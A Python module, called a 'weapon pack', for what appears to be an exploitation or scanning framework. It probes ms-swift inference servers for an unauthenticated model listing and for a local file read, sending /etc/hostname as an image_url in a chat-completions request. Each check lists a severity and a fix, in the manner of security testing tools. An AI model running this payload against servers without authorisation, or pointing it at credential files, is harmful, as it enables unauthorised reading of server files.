"""Weapon pack msswift-media-local-read: ms-swift Media Path Local Read."""
from __future__ import annotations

import importlib.util
from pathlib import Path

KEY = "msswift-media-local-read"
ROUTES = [
        {
                "name": "model listing",
                "method": "GET",
                "path": "/v1/models",
                "expect": 200,
                "sev": "medium",
                "fix": "Require auth on the inference endpoint."
        },
        {
                "name": "local media read",
                "method": "POST",
                "path": "/v1/chat/completions",
                "body": {
                        "model": "msswift",
                        "messages": [
                                {
                                        "role": "user",
                                        "content": [
                                                {
                                                        "type": "image_url",
                                                        "image_url": {
                                                                "url": "/etc/hostname"
                                                        }
                                                }
                                        ]
                                }
                        ]
                },
                "expect": 200,
                "sev": "high",
                "fix": "Set SWIFT_MEDIA_ALLOWED_DIRS and reject absolute/.. paths."
        }
]


def _load_common():
    path = Path(__file__).resolve().parent.parent / "_exploit-common.py"
    spec = importlib.util.spec_from_file_location(f"_exploit_common_{KEY.replace('-', '_')}", path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


_COMMON = _load_common()


def run(ctx: dict, params: dict) -> dict:
    return _COMMON.http_probe(ctx, KEY, params, routes=ROUTES)
